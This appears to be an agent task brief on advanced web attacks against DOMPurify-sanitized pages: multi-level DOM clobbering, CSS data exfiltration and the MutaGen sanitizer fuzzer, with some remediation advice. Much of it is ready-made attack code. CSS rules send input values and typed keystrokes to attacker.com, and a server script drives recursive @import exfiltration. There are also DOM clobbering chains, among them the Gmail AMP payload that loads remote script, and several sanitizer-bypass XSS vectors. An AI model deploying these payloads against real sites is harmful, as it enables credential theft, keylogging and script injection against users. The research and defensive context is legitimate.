# AGENT TASK: Advanced DOM Clobbering, CSS Exfiltration, and Parser Fuzzing
# PURPOSE: Multi-level DOM clobbering, CSS data exfiltration, MutaGen fuzzer methodology
# PRIORITY: High - DOM clobbering bypasses DOMPurify entirely
# INPUTS: Target page structure, style tags/attributes allowed, sensitive data on page
# OUTPUT: DOM clobbering chains, CSS exfiltration PoC, parser fuzzing results
# SECTIONS: F4 (DOM Clobbering), F5 (CSS Exfiltration), F6 (MutaGen Fuzzer)
---

## SECTION F4: Advanced DOM Clobbering Forensics

### Beyond Basic Clobbering: Multi-Level Property Access

DOM clobbering exploits the HTML spec's "named access on the Window object" (Section 7.3.3) and similar mechanisms on `document`. Elements with `id` or `name` attributes become properties on `window` and `document`, potentially shadowing legitimate JavaScript variables and API properties.

The original document covers basic DOM clobbering. This section details advanced techniques that achieve deeper property chain access and real-world exploitation.

#### Multi-Level Property Access via HTMLFormElement

`HTMLFormElement` provides unique clobbering capabilities because form elements with `name` attributes become **properties of the form element itself**:

```html
<form id="config">
  <input name="environment" value="production" />
</form>

<script>
// 3-level property access achieved:
// window.config            ──► <form> element
// window.config.environment ──► <input> element  
// window.config.environment.value ──► "production" (string)

console.log(config.environment.value); 
// Output: "production"

// Application code expecting a config object:
if (config.environment.value === "production") {
  // Attacker controls this branch
  loadProductionConfig(); 
}
</script>
```

**Property access chain:**
```
window
  └── "config" (named element access)
        └── HTMLFormElement
              └── "environment" (form element access by name)
                    └── HTMLInputElement
                          └── "value" (native property)
                                └── "production" (string)
```

This achieves 3 levels of property access: `config.environment.value`. Traditional clobbering with just `<div id="config">` only provides 1 level.

#### HTMLCollection for 3+ Level Access

When multiple elements share the same `id`, `document.getElementById` returns the first one, but `window[id]` may return an `HTMLCollection` in some browsers. More importantly, the **`name` attribute on a second same-id form** creates a named property on the collection:

```html
<!-- Two forms with the same id create an HTMLCollection on window -->
<form id="config"></form>
<form id="config" name="prod">
  <input name="apiUrl" value="https://evil.com" />
</form>

<script>
// window.config ──► HTMLCollection [<form>, <form>]
// window.config.prod ──► second <form> (accessed by name on collection)
// window.config.prod.apiUrl ──► <input> element
// window.config.prod.apiUrl.value ──► "https://evil.com"

// 4-level property access:
console.log(config.prod.apiUrl.value);
// Output: "https://evil.com"

// Vulnerable application code:
fetch(config.prod.apiUrl.value + "/data")
  // Sends request to attacker-controlled server
</script>
```

**Property access chain (4 levels):**
```
window
  └── "config" (HTMLCollection -- multiple same-id elements)
        └── HTMLCollection
              └── "prod" (named item access on collection)
                    └── HTMLFormElement
                          └── "apiUrl" (form element access by name)
                                └── HTMLInputElement
                                      └── "value" (native property)
                                            └── "https://evil.com"
```

#### Iframe srcdoc for Deeper Nesting

`<iframe>` elements with `name` attributes create properties on `window`, and their `contentWindow` exposes the iframe's inner window object. Using `srcdoc`, an attacker can create a fully controlled nested document:

```html
<iframe name="moreLevel" srcdoc='
  <form id="config">
    <input name="key" value="stolen" />
  </form>
'></iframe>

<script>
// Access chain (with timing considerations):
// window.moreLevel ──► iframe's contentWindow
// window.moreLevel.config ──► <form> in iframe
// window.moreLevel.config.key ──► <input> in iframe  
// window.moreLevel.config.key.value ──► "stolen"

// Must wait for iframe to load:
window.moreLevel.addEventListener('load', () => {
  console.log(moreLevel.config.key.value);
  // Output: "stolen"
});
</script>
```

**Limitation:** This requires the application code to traverse into iframe content windows, which is less common. However, applications that use iframes for sandboxing or micro-frontends may have exactly this pattern.

**DOMPurify note:** DOMPurify allows `<iframe>` elements by default but strips `srcdoc` in its default configuration since DOMPurify 2.0.1. However, if `ADD_ATTR: ['srcdoc']` is configured (e.g., for rich text editors that use iframes), this vector opens up.

#### Prototype Chain + Clobbering Combination Attack

This sophisticated attack combines DOM clobbering with prototype pollution to create especially dangerous scenarios:

**The setup:**

```html
<!-- Clobber document.cookie with an HTML element -->
<img name="cookie" id="cookie" />

<script>
// document.cookie is now an HTMLImageElement, not a string
console.log(typeof document.cookie); // "object" (HTMLImageElement)
console.log(document.cookie); // <img name="cookie" id="cookie">

// Template literals call toString():
console.log(`${document.cookie}`); // "[object HTMLImageElement]"

// BUT: if prototype pollution is also present:
Object.prototype.toString = function() { return 'session=attacker_token'; };

// Now:
console.log(`${document.cookie}`); 
// Output: "session=attacker_token"
// Because: HTMLImageElement.toString() ──► walks prototype chain
//          ──► finds polluted Object.prototype.toString
//          ──► returns attacker-controlled string

// Vulnerable pattern (common in analytics/tracking code):
sendToServer({ cookies: `${document.cookie}` });
// Sends "session=attacker_token" to server
</script>
```

**Attack chain diagram:**
```
Prototype Pollution              DOM Clobbering
(separate vulnerability)         (via sanitized HTML)
         │                              │
         ▼                              ▼
Object.prototype.toString    <img name="cookie">
= () => 'evil=value'         clobbers document.cookie
         │                              │
         └──────────┬───────────────────┘
                    │
                    ▼
         Template literal: `${document.cookie}`
                    │
                    ▼
         HTMLImageElement.toString()
                    │
                    ▼
         Prototype chain lookup:
         HTMLImageElement.prototype ──► no toString
         Element.prototype ──► no toString
         Node.prototype ──► no toString
         EventTarget.prototype ──► no toString
         Object.prototype ──► POLLUTED toString found
                    │
                    ▼
         Returns: 'evil=value'
                    │
                    ▼
         Application uses this as if it were
         the real document.cookie string
```

**Real-world applicability:** This requires two separate vulnerabilities (prototype pollution AND DOM clobbering through sanitized HTML), but both are common in modern web applications. Prototype pollution gadgets are regularly found in popular libraries (lodash, jQuery, etc.), and DOM clobbering survives standard DOMPurify sanitization.

### Real-World Case Study: Gmail AMP4Email XSS (2019)

One of the most impactful DOM clobbering exploits in the wild targeted Google's AMP4Email, the AMP framework used within Gmail to render dynamic email content.

**Background:** AMP4Email allowed a subset of AMP HTML within Gmail messages. The AMP runtime loaded and executed in the email rendering context, relying on various JavaScript variables and conditions to determine its behavior.

**The exploit payload (injected via email HTML):**

```html
<!-- Clobber AMP_MODE variable used by AMP loader -->
<a id="AMP_MODE" name="localDev"></a>
<a id="AMP_MODE" name="test"></a>

<!-- Clobber testLocation to control script source -->
<a id="testLocation"></a>
<a id="testLocation" name="protocol" href="https://pastebin.com/raw/0tn8z0rG#"></a>
```

**How the exploit chain worked:**

```
AMP Runtime Loader Code (simplified):
======================================

// Check if running in development mode:
if (window.AMP_MODE?.localDev || window.AMP_MODE?.test) {
  // Development mode -- load scripts from testLocation
  var scriptUrl = window.testLocation?.protocol + 
                  '//cdn.ampproject.org/v0.js';
  loadScript(scriptUrl);
}

Clobbered Values:
======================================

window.AMP_MODE 
  ──► HTMLCollection [<a id="AMP_MODE">, <a id="AMP_MODE">]

window.AMP_MODE.localDev  
  ──► first <a> (has name="localDev") ──► truthy!

window.AMP_MODE.test      
  ──► second <a> (has name="test") ──► truthy!

// Development mode check PASSES

window.testLocation
  ──► HTMLCollection [<a id="testLocation">, <a id="testLocation">]

window.testLocation.protocol
  ──► second <a> (has name="protocol")

window.testLocation.protocol + '//cdn.ampproject.org/v0.js'
  ──► <a>.toString() + '//cdn.ampproject.org/v0.js'
  ──► "https://pastebin.com/raw/0tn8z0rG#//cdn.ampproject.org/v0.js"

// The # makes everything after it a fragment identifier
// Actual URL loaded: https://pastebin.com/raw/0tn8z0rG
// Contains attacker-controlled JavaScript!
```

**Impact:** Arbitrary JavaScript execution in Gmail's email rendering context, potentially allowing:
- Reading other emails
- Sending emails as the victim
- Accessing Gmail API tokens
- Modifying email filters and forwarding rules

**Why DOM clobbering survived sanitization:** The `<a>` elements in the payload contain no event handlers, no `javascript:` URIs, and no script elements. They are completely benign HTML from a sanitizer's perspective. DOMPurify (and any standard sanitizer) would pass them through unchanged. The danger came entirely from how AMP's JavaScript runtime interpreted the clobbered global variables.

### Hulk Framework: Automated DOM Clobbering Discovery (USENIX Security 2025)

**Source:** "Hulk: Automated Discovery of DOM Clobbering Vulnerabilities at Scale" -- USENIX Security 2025

The Hulk framework represents the state of the art in automated DOM clobbering vulnerability discovery, demonstrating that clobbering vulnerabilities are far more prevalent than previously understood.

**Methodology:**

```
Hulk Pipeline:
==============

1. JavaScript Analysis (Static)
   ├── Parse all scripts on target page
   ├── Build data flow graph
   ├── Identify "clobberable sinks" -- code paths that:
   │   ├── Read window[...] or document[...]
   │   ├── Use the value in a security-sensitive operation
   │   └── Don't validate the type/origin of the value
   └── Output: candidate sink list with required clobber shapes

2. Symbolic DOM Model
   ├── Model DOM API named access behavior symbolically
   ├── Track property access chains (1-level, 2-level, N-level)
   ├── Model type coercion (toString, valueOf, Symbol.toPrimitive)
   └── Support HTMLFormElement, HTMLCollection, iframe patterns

3. Concolic Execution
   ├── Execute JavaScript with symbolic DOM values
   ├── At each branch, fork execution:
   │   ├── One path: clobbered value satisfies condition
   │   └── Other path: clobbered value doesn't satisfy
   ├── Track which clobber shapes reach dangerous sinks
   └── Generate concrete clobbering payloads for each path

4. Validation
   ├── Inject generated payloads into target page
   ├── Verify that the sink is actually reached
   ├── Confirm security impact (XSS, CSRF, redirect, etc.)
   └── Deduplicate and classify results
```

**Results on Tranco Top 5,000 websites:**

| Vulnerability Type | Count | Percentage |
|-------------------|-------|------------|
| XSS (Cross-Site Scripting) | 378 | 76.1% |
| CSRF (Cross-Site Request Forgery) | 90 | 18.1% |
| Open Redirect | 26 | 5.2% |
| Storage Manipulation | 3 | 0.6% |
| **Total unique gadgets** | **497** | **100%** |

**19 CVEs were assigned** from Hulk's findings, affecting major web applications and popular JavaScript libraries.

**Key findings relevant to DOMPurify:**

1. **Common clobberable patterns:**
   ```javascript
   // Pattern 1: Config object access (most common)
   var endpoint = window.CONFIG?.apiUrl || 'default';
   
   // Pattern 2: Feature flag check
   if (window.DEBUG || window.DEVELOPMENT) { /* dangerous path */ }
   
   // Pattern 3: Script/resource loading
   var src = window.cdnBase + '/lib.js';
   
   // Pattern 4: URL construction
   window.location = window.redirectUrl || '/home';
   ```

2. **Library-specific gadgets:** jQuery, React, Angular, Vue, and numerous smaller libraries contained code paths reachable via DOM clobbering. The clobber targets were often configuration objects, feature flags, or resource URLs.

3. **Third-party script amplification:** CDN-loaded analytics, advertising, and social media scripts were the most common source of clobberable sinks, because they execute in the page's origin context but are developed without knowledge of the page's specific security requirements.

### DOMPurify Clobbering Gap Analysis

DOMPurify implements several anti-clobbering mechanisms, but significant gaps remain:

**What DOMPurify protects:**

```javascript
// DOMPurify's _isClobbered() check (simplified):
function _isClobbered(element) {
  // Check 13 properties that clobbering typically affects:
  return (
    element instanceof HTMLFormElement && (
      typeof element.nodeName !== 'string' ||
      typeof element.textContent !== 'string' ||
      typeof element.removeChild !== 'function' ||
      !(element.attributes instanceof NamedNodeMap) ||
      typeof element.removeAttribute !== 'function' ||
      typeof element.setAttribute !== 'function' ||
      typeof element.namespaceURI !== 'string' ||
      typeof element.insertBefore !== 'function' ||
      typeof element.hasChildNodes !== 'function'
      // ... additional checks
    )
  );
}
```

This check detects when a **form element's own properties** have been clobbered by its children (e.g., `<form><input name="nodeName"></form>` where `form.nodeName` returns the input element instead of the string "FORM"). If clobbering is detected, DOMPurify removes the element entirely.

**What DOMPurify does NOT protect against:**

1. **Non-form element clobbering:** The `_isClobbered` check focuses on `HTMLFormElement`. Elements like `<a>`, `<img>`, `<embed>`, and `<object>` with `id`/`name` attributes still clobber `window` and `document` properties without triggering this check.

2. **Application-level clobbering:** DOMPurify's prototype-method caching (e.g., caching `Element.prototype.removeChild` before processing) protects DOMPurify's **own** operations from clobbering interference. But application code that reads DOM properties after sanitization is still vulnerable:

   ```javascript
   // DOMPurify's internal protection:
   const _removeChild = Node.prototype.removeChild;
   // Cached before sanitization, immune to clobbering
   
   // Application code AFTER sanitization (NOT protected):
   const userContent = DOMPurify.sanitize(untrusted);
   document.getElementById('output').innerHTML = userContent;
   
   // If userContent contains: <a id="someGlobal" href="evil">
   // window.someGlobal is now clobbered
   // Any application code reading window.someGlobal is vulnerable
   ```

3. **Cross-document clobbering:** If sanitized content is inserted into a different document (e.g., via iframe), clobbering affects that document's global scope, which DOMPurify cannot anticipate.

**SANITIZE_NAMED_PROPS (non-default):**

DOMPurify offers `SANITIZE_NAMED_PROPS` as a non-default option:

```javascript
DOMPurify.sanitize(dirty, { SANITIZE_NAMED_PROPS: true });
```

When enabled, this prefixes all `id` and `name` attributes with `user-content-`:

```html
<!-- Input -->
<a id="config" name="apiUrl" href="https://evil.com">click</a>

<!-- Output with SANITIZE_NAMED_PROPS -->
<a id="user-content-config" name="user-content-apiUrl" href="https://evil.com">click</a>
```

This prevents clobbering of `window.config` (it becomes `window['user-content-config']` instead), but:
- It's not enabled by default (backward compatibility)
- It breaks legitimate CSS selectors targeting the original IDs
- It breaks JavaScript code referencing elements by ID
- It doesn't prevent clobbering of `user-content-*` named properties (unlikely but possible)
- Fragment navigation (`#config`) breaks unless updated

**Recommendation:** Applications handling user-generated HTML in contexts where DOM clobbering is a concern should enable `SANITIZE_NAMED_PROPS` and update their CSS/JS to use the prefixed names, or implement a Content Security Policy that mitigates the impact of clobbered variables.

---

## SECTION F5: CSS Exfiltration Through DOMPurify -- The Undefended Channel

### The Explicit Non-Goal

DOMPurify's documentation states clearly:

> "DOMPurify is not -- and will never be -- a CSS sanitizer."

This is a deliberate architectural decision, not an oversight. CSS sanitization is a fundamentally different problem from HTML sanitization, requiring a CSS parser, understanding of CSS cascade and inheritance, and knowledge of which CSS features can cause side effects. DOMPurify chose to focus on HTML/SVG/MathML sanitization and leave CSS handling to the application.

However, this creates a significant gap: **DOMPurify allows `<style>` elements and `style` attributes by default**, passing CSS content through unsanitized. An attacker who can inject CSS through sanitized HTML has a powerful data exfiltration channel.

### Fontleak: State-of-the-Art CSS Exfiltration (2025)

**Source:** https://adragos.ro/fontleak/

Fontleak, published in 2025, represents the most sophisticated CSS-based data exfiltration technique demonstrated to date. It exfiltrated PII and access tokens from chatgpt.com in approximately 7 minutes, leaking roughly 1,000 characters in under a minute.

**Technical mechanism:**

```
Fontleak Pipeline:
==================

1. Custom Font Construction (OpenType/WOFF2)
   ├── Create font with GSUB (Glyph Substitution) table
   ├── Define ligature substitutions for character sequences:
   │   ├── "se" ──► glyph of width 100px
   │   ├── "sec" ──► glyph of width 200px  
   │   ├── "secr" ──► glyph of width 300px
   │   ├── "secre" ──► glyph of width 400px
   │   └── "secret" ──► glyph of width 500px
   └── Each target character sequence maps to a unique glyph width

2. CSS @container Width Detection
   ├── Apply custom font to target text element
   ├── Text renders with ligature-substituted glyphs
   ├── Container width changes based on glyph widths
   └── @container queries detect specific width ranges:
   
   @font-face {
     font-family: 'leak';
     src: url('attacker.com/font.woff2');
   }
   
   .target-text {
     font-family: 'leak';
     container-type: inline-size;
   }
   
   @container (min-width: 500px) {
     .probe::after {
       content: url('https://attacker.com/leak?match=secret');
     }
   }

3. Server-Side Orchestration
   ├── Serve initial CSS with broad character probes
   ├── Receive width-match callbacks identifying characters present
   ├── Generate new font with refined ligature substitutions
   ├── Serve updated CSS via @import or CSS Custom Properties
   └── Iterate until full text is extracted

4. Result Assembly
   ├── Order leaked character sequences by position
   ├── Reconstruct original text
   └── Approximately 1,000 characters per minute throughput
```

**Why this bypasses DOMPurify:** The entire attack consists of valid CSS -- `@font-face`, `@container`, `content: url()`, and font ligature tables. No JavaScript, no event handlers, no HTML injection. DOMPurify passes the `<style>` element through completely untouched.

**chatgpt.com proof of concept:** The researcher demonstrated extraction of a user's name, email, and last few characters of their access token from the ChatGPT interface, requiring only the ability to inject a `<style>` element into the page.

### CSS Attribute Selector Exfiltration

A simpler but still effective technique uses CSS attribute selectors to probe input values character by character:

```css
/* Probe each possible prefix of the input value */
input[value^="s"] { 
  background: url('https://attacker.com/leak?prefix=s'); 
}
input[value^="se"] { 
  background: url('https://attacker.com/leak?prefix=se'); 
}
input[value^="sec"] { 
  background: url('https://attacker.com/leak?prefix=sec'); 
}
input[value^="secr"] { 
  background: url('https://attacker.com/leak?prefix=secr'); 
}
input[value^="secre"] { 
  background: url('https://attacker.com/leak?prefix=secre'); 
}
input[value^="secret"] { 
  background: url('https://attacker.com/leak?prefix=secret'); 
}

/* The browser loads the background URL for the longest matching prefix */
/* Attacker server receives: GET /leak?prefix=secret */
```

**Limitations:**
- Only works on elements with the value reflected as an HTML attribute (not just a DOM property)
- Requires generating O(n * charset_size) CSS rules
- Only the longest match triggers a request (not all prefixes)
- Does not work on `<textarea>` (content is text node, not attribute)

### CSS Keylogging in React Applications

React's reconciliation algorithm creates a unique CSS exfiltration opportunity. Unlike vanilla HTML where `<input>` value attributes are only set initially, React **updates the `value` attribute in real-time** as the user types to keep the DOM in sync with component state:

```css
/* React keylogger CSS */
input[value$="a"] { background: url('https://attacker.com/log?key=a'); }
input[value$="b"] { background: url('https://attacker.com/log?key=b'); }
input[value$="c"] { background: url('https://attacker.com/log?key=c'); }
/* ... one rule per character */
input[value$="z"] { background: url('https://attacker.com/log?key=z'); }
input[value$="0"] { background: url('https://attacker.com/log?key=0'); }
/* ... */
input[value$="9"] { background: url('https://attacker.com/log?key=9'); }
input[value$="@"] { background: url('https://attacker.com/log?key=%40'); }
```

**How it works:**
```
User types "p" ──► React sets input[value="p"]
  ──► CSS matches input[value$="p"]
  ──► Browser loads: attacker.com/log?key=p

User types "a" ──► React sets input[value="pa"]
  ──► CSS matches input[value$="a"]
  ──► Browser loads: attacker.com/log?key=a

User types "s" ──► React sets input[value="pas"]
  ──► CSS matches input[value$="s"]
  ──► Browser loads: attacker.com/log?key=s

User types "s" ──► React sets input[value="pass"]
  ──► CSS matches input[value$="s"]
  ──► Browser: already loaded this URL, uses cache (no request)
  ──► Attacker misses this keystroke (or uses cache-busting)
```

**Limitation:** Repeated characters produce the same URL, so the browser caches and doesn't re-request. This can be partially mitigated by the attacker using `$=` selectors on longer suffixes, at the cost of more CSS rules.

**React-specific detail:** This does NOT work in vanilla HTML because the `value` attribute is not updated by user input (only the DOM property changes). It works in React because React's controlled component model explicitly sets `element.setAttribute('value', newValue)` during reconciliation.

### @import Recursive Exfiltration

The `@import` rule's ability to load external stylesheets enables a sophisticated recursive exfiltration technique:

```
Attack Flow:
============

1. Injected CSS:
   @import url('https://attacker.com/steal?step=0');

2. Attacker server DELAYS response, waiting for data

3. Meanwhile, other CSS rules on the page exfiltrate 
   initial characters via attribute selectors

4. Attacker receives: ?prefix=sec

5. NOW attacker responds to the @import with:
   input[value^="seca"] { background: url('...?step=1&found=seca'); }
   input[value^="secb"] { background: url('...?step=1&found=secb'); }
   ...
   @import url('https://attacker.com/steal?step=2');

6. Process repeats -- each @import response probes the
   next character based on what was already learned

7. The @import chain deepens:
   Step 0: learn first char
   Step 1: learn second char (given first)
   Step 2: learn third char (given first two)
   ...
   Step N: learn Nth char (given first N-1)
```

**Server-side pseudo-code:**
```python
known_prefix = ""

@app.route('/steal')
def steal():
    step = request.args.get('step', 0)
    found = request.args.get('found', '')
    
    if found:
        known_prefix = found
    
    # Generate CSS rules probing the next character
    css = ""
    for char in "abcdefghijklmnopqrstuvwxyz0123456789":
        probe = known_prefix + char
        css += f'input[value^="{probe}"] {{ '
        css += f'background: url("https://attacker.com/steal?step={step+1}&found={probe}"); '
        css += '}\n'
    
    # Chain the next @import
    css += f'@import url("https://attacker.com/steal?step={step+1}");'
    
    return Response(css, mimetype='text/css')
```

### @font-face Character Detection

`@font-face` with `unicode-range` can detect the presence of specific characters in text content:

```css
/* Detect each character individually */
@font-face {
  font-family: 'detect-A';
  src: url('https://attacker.com/probe?char=A');
  unicode-range: U+0041; /* Capital A */
}
@font-face {
  font-family: 'detect-B';
  src: url('https://attacker.com/probe?char=B');
  unicode-range: U+0042; /* Capital B */
}
/* ... one @font-face per character of interest ... */

.target-text {
  font-family: 'detect-A', 'detect-B', /* ... */ 'fallback-font';
}
```

**How it works:** The browser only downloads a `@font-face` source if the element using that font family contains characters in the specified `unicode-range`. By defining one font per character (each with a unique probe URL), the attacker learns which characters appear in the target text.

**Limitation:** This reveals character **presence**, not position or frequency. It tells the attacker that the text contains 'A', 'e', 's', 'c', 'r', 't' but not that it spells "secret."

### Ligature-Based Text Extraction

An evolution of the `@font-face` technique uses SVG font ligatures to determine character **sequences**, not just individual characters:

```css
@font-face {
  font-family: 'ligature-probe';
  src: url('attacker.com/font-ab.svg') format('svg');
  /* SVG font defines ligature: "ab" ──► glyph width 9999px */
}

.target::-webkit-scrollbar { display: block; }
.target::-webkit-scrollbar-track { 
  background: url('https://attacker.com/detected?seq=ab'); 
}

.target {
  font-family: 'ligature-probe';
  overflow: auto;
  width: 100px;
  /* If "ab" appears in text, ligature glyph is 9999px wide */
  /* This causes horizontal overflow */
  /* Scrollbar appears */
  /* Scrollbar track background URL is loaded */
  /* Attacker learns "ab" appears in text */
}
```

This technique combines:
1. SVG fonts with wide ligature glyphs for specific character sequences
2. CSS overflow detection via scrollbar styling (WebKit-specific)
3. URL loading triggered by scrollbar visibility

### CSS Serialization Injection (Chromium)

**Chromium Issue 343000522:** A bug in Chromium's CSS serialization where `@keyframes` rule names were not properly escaped during `cssText` property access.

```javascript
// Normal @keyframes serialization:
const style = document.createElement('style');
style.textContent = '@keyframes test { from { opacity: 0; } to { opacity: 1; } }';
document.head.appendChild(style);
console.log(style.sheet.cssRules[0].cssText);
// Expected: "@keyframes test { from { opacity: 0; } to { opacity: 1; } }"

// Exploitable case:
style.textContent = '@keyframes "}</style><img src=x onerror=alert(1)>" { }';
// The keyframe name contains CSS-injection payload
// When serialized via cssText, the quotes/escaping was mishandled
// Leading to injection when the serialized CSS was re-inserted into HTML
```

**Google CTF 2024 "web-in-the-shadows" usage:** This serialization bug was featured in the Google CTF 2024 challenge "web-in-the-shadows," where contestants exploited CSS serialization differences between the server-side CSS parser and Chromium's runtime serialization to achieve XSS through a sanitized CSS pipeline.

### Comprehensive Remediation

The CSS exfiltration channel can be closed at multiple levels:

**1. DOMPurify Configuration (Application Level):**
```javascript
const clean = DOMPurify.sanitize(dirty, {
  FORBID_TAGS: ['style'],      // Remove all <style> elements
  FORBID_ATTR: ['style'],      // Remove all style="" attributes
});
```
This eliminates the entire CSS injection surface. It is the single most effective mitigation.

**2. Content Security Policy (Transport Level):**
```
Content-Security-Policy: 
  style-src 'self';           /* Blocks inline <style> elements */
  font-src 'self';            /* Blocks external font loading (fontleak) */
  img-src 'self';             /* Blocks CSS background: url() exfiltration */
```
Note: `style-src` without `'unsafe-inline'` blocks `<style>` elements but NOT `style=""` attributes in most browsers (attributes require `'unsafe-hashes'` or a hash). However, some CSS exfiltration techniques use `<style>` elements specifically.

**3. Subresource Integrity (Asset Level):**
```html
<link rel="stylesheet" href="style.css" 
      integrity="sha384-..." 
      crossorigin="anonymous">
```
Prevents loading of attacker-controlled stylesheets via compromised CDNs, but does not prevent inline CSS injection.

**4. CSS Sanitization Libraries (Defense in Depth):**
- **css-sanitize:** Validates CSS against a whitelist of allowed properties and values
- **sanitize-css:** Removes potentially dangerous CSS constructs
- **csso:** CSS optimizer that can strip url() values and @import rules

**Critical note on style attributes:** Even with `FORBID_TAGS: ['style']`, the `style` attribute on elements may still be exploitable:
```html
<div style="background: url('https://attacker.com/leak?data=1')">
```
The `FORBID_ATTR: ['style']` configuration is needed to close this gap. For applications that need to allow some inline styling, DOMPurify's `ALLOWED_ATTR` with explicit style property validation (via hooks) is necessary.

---

## SECTION F6: MutaGen Parser Differential Fuzzer -- State of the Art

### TU Braunschweig's MutaGen Framework

**Source:** "On the Parsing Differentials of HTML Sanitizers" -- TU Braunschweig  
**Paper:** https://www.ias.cs.tu-bs.de/publications/parsing_differentials.pdf

The MutaGen framework from the Institute for Application Security at TU Braunschweig is the most comprehensive parser differential fuzzing system targeting HTML sanitizers. Written in approximately 1,100 lines of OCaml, it systematically discovers mismatches between how sanitizers parse HTML and how browsers parse the same HTML.

### Architecture and Methodology

```
MutaGen Pipeline:
=================

1. Seed Generation
   ├── Basic payloads: <img>, <image>, <script>, <svg>, <math>
   ├── Each seed includes an "oracle" -- a detectable signal
   │   (e.g., onerror=alert(1), javascript: URI)
   └── Seed pool size: ~50 base payloads

2. Mutation Engine (25 transformation types)
   ├── Tag mutations:
   │   ├── Insert random tags around/within payload
   │   ├── Use rawtext tags (textarea, title, xmp, iframe, noembed)
   │   ├── Add namespace context (svg, math wrappers)
   │   ├── Nest foreign content integration points
   │   └── Duplicate/reorder/remove closing tags
   │
   ├── Attribute mutations:
   │   ├── Add random attributes with special characters
   │   ├── Insert unquoted/single-quoted/double-quoted values
   │   ├── Include < > characters in attribute values
   │   ├── Use entity-encoded characters
   │   └── Mix attribute formats within single element
   │
   ├── Comment mutations:
   │   ├── Standard comments: <!-- ... -->
   │   ├── Bang comments: <!--> and <!--->
   │   ├── Malformed comments: --!> (known differential)
   │   └── Nested/overlapping comments
   │
   ├── CDATA mutations:
   │   ├── <![CDATA[ ... ]]> sections
   │   ├── CDATA in HTML context (treated as comment)
   │   ├── CDATA in SVG/MathML context (valid)
   │   └── Partial/malformed CDATA sections
   │
   └── Encoding mutations:
       ├── Character references (&#x...; &#...;)
       ├── Named entities (&amp; &lt; etc.)
       ├── NULL bytes within tokens
       └── Non-ASCII characters in tag/attribute names

3. Payload Generation
   ├── Apply 1 to N random mutations to each seed
   ├── N typically up to 25 for maximum complexity
   ├── Deduplication via structural hashing
   └── Generated ~12 million unique payloads over test period

4. Differential Testing
   ├── For each payload:
   │   ├── Send through sanitizer ──► get sanitized output
   │   ├── Parse sanitized output in each browser engine:
   │   │   ├── Chromium (document mode & fragment mode)
   │   │   ├── Firefox (document mode & fragment mode)
   │   │   └── WebKit (document mode & fragment mode)
   │   ├── Check if oracle signal survives in any browser's DOM
   │   └── If oracle survives ──► BYPASS FOUND
   │
   └── Oracle detection:
       ├── JavaScript execution monitoring
       ├── Event handler firing (onerror, onload, etc.)
       ├── Script element content inspection
       └── Navigation to javascript: URIs

5. Similarity Analysis ("Bag of XPaths")
   ├── For each DOM tree, extract all XPaths to text/element nodes
   ├── Create multiset (bag) of XPath patterns
   ├── Compare bags between sanitizer's expected DOM and browser's actual DOM
   ├── Jaccard similarity on bags identifies structural differences
   └── Low similarity ──► high probability of parser differential
```

### Test Execution and Results

**Test parameters:**
- Duration: 14.5 days of continuous fuzzing
- Payloads tested: ~12 million unique fragments
- Browsers: Chromium, Firefox, WebKit
- Modes: document parsing (`document.write`) and fragment parsing (`innerHTML`)
- Sanitizers: 11 libraries across multiple languages

**Results summary:**

| Category | Bypasses Found | Sanitizers Affected |
|----------|---------------|-------------------|
| Rawtext tag mishandling | 4 | DOMPurify, sanitize-html, js-xss |
| Noscript behavior | 3 | DOMPurify, Ammonia, Bleach |
| Wrong namespace transitions | 3 | sanitize-html, js-xss, HtmlSanitizer |
| CDATA handling | 2 | Ammonia, lolhtml |
| Bang comments (--!>) | 2 | DOMPurify, sanitize-html |
| Integration point confusion | 1 | DOMPurify |
| Custom element interaction | 1 | Ammonia |
| **Total** | **16** | **11 libraries** |

### Recurring Issue Classes

**1. Rawtext tag mishandling:**

Rawtext elements (`<textarea>`, `<title>`, `<xmp>`, `<iframe>`, `<noembed>`, `<noframes>`) parse their content as raw text until the matching closing tag is found. Sanitizers must understand this behavior exactly:

```html
<!-- Payload -->
<textarea><img src=x onerror=alert(1)></textarea>

<!-- Sanitizer might see: -->
<textarea> element containing text "<img src=x onerror=alert(1)>"
──► Safe (text content, not an element)

<!-- But if sanitizer incorrectly processes the inner content: -->
<textarea></textarea><img src=x onerror=alert(1)>
──► XSS! (img is now a sibling, not textarea content)
```

The mutation engine discovered that certain combinations of nested rawtext tags confused sanitizers about where the rawtext parsing mode ends:

```html
<title><textarea></title><img src=x onerror=alert(1)>
```

A sanitizer might treat `<textarea>` as starting rawtext mode (looking for `</textarea>` to end it), but the browser ends the `<title>` rawtext at `</title>`, exposing the `<img>` element.

**2. Noscript behavior:**

The `<noscript>` element is parsed completely differently depending on whether scripting is enabled:

```
Scripting ENABLED (browser with JS):
<noscript> content is treated as raw text
──► <noscript><img src=x onerror=alert(1)></noscript>
    is safe (raw text, not parsed as HTML)

Scripting DISABLED (sanitizer's DOMParser):
<noscript> content is parsed as HTML
──► <noscript><img src=x onerror=alert(1)></noscript>
    creates an <img> element inside <noscript>
    
The differential:
- DOMParser (scripting disabled) sees the <img> and REMOVES it
- But the browser (scripting enabled) never saw an <img>
  (it was raw text), so removal changes the raw text content
- Result: corrupted output that may be exploitable
```

DOMPurify addressed this with `FORCE_BODY` mode, which removes `<noscript>` entirely in its default configuration. However, applications that explicitly allow `<noscript>` via `ADD_TAGS` re-open this vector.

**3. Wrong namespace transitions:**

The HTML parser switches between HTML, SVG, and MathML parsing rules at specific "integration points." Getting these transitions wrong by even one element can cause a sanitizer to misinterpret the rest of the document:

```html
<math><mtext><table><mglyph><style>
```

The `<mtext>` element is an HTML integration point in MathML. The `<table>` starts HTML parsing. But `<mglyph>` is a MathML element that, in certain parser states, can switch back to MathML parsing. The `<style>` element is then interpreted differently in MathML context vs. HTML context.

**4. CDATA handling:**

CDATA sections (`<![CDATA[ ... ]]>`) are valid in SVG and MathML but treated as bogus comments in HTML. Sanitizers that process CDATA uniformly across namespaces get this wrong:

```html
<svg><![CDATA[<img src=x onerror=alert(1)>]]></svg>
```

In SVG context, CDATA is character data (safe). But if the sanitizer strips the SVG wrapper while keeping the CDATA content, the browser parses the CDATA as an HTML comment, and the `<img>` may become an element.

**5. Bang comments (--!>):**

The `--!>` sequence is a valid comment close in HTML, but many parsers and sanitizers don't recognize it:

```html
<!-- --!><img src=x onerror=alert(1)><!-- -->
```

A sanitizer that doesn't recognize `--!>` as closing the comment treats the `<img>` as comment content (safe). The browser, however, closes the comment at `--!>` and parses the `<img>` as an element.

### JavaScript MutaGen Research Lab

**Source:** https://github.com/Robert-Doe/mutagen

A complementary JavaScript implementation provides 11 specialized mutation modules and 7 DOM sink differentials for targeted testing:

